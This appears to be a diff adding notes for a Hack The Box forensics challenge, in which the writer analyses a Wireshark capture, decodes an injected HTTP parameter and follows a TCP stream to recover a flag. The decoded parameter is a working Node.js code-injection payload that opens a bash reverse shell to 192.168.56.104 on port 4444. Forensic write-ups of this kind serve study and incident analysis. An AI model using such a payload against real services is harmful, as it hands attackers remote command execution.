@@ -1,0 +1,11 @@
+- This challenges includes downloadable files -> .pcapng file hence the challenge is based on wireshark
+- First we filter the packets based on just http protocol
+	- One specific packet has random characters used in the parameter -> hints at code injection
+	- Check what the code actually does by pasting the parameter value in cyberchef -> it automatically uses url decoder and decodes it => `user=exploit() {} && ((()=>{ global.process.mainModule.require("child_process").execSync("bash -c 'bash -i >& /dev/tcp/192.168.56.104/4444 0>&1'"); })()) && function pwned`
+	- Now we can guess what the payload would have done -> it has created a child process and spawned a bash shell which interactively takes input from given file and outputs into the same file (**it has essentially created a remote shell**)
+		- Since we know the port that gives input and gets output from the remote shell we can dig into packets specific to that port
+		- Now remove all filters and order the packets by the time
+		- The first tcp packet after the http request with the exploit payload shows the start of the details shared through the remote shell (namely packet with No. 105)
+		- We can now follow the TCP stream and get the entire connection details
+		- We see a `cat /flag` in the data and a long string after that -> flag is encoded, paste it in cyberchef to find the encoding and decode to get flag
+		- Flag -> `HTB{f0rb1dd3n_m4nu5cr1p7_15_1n_7h3_<obfuscated>}`
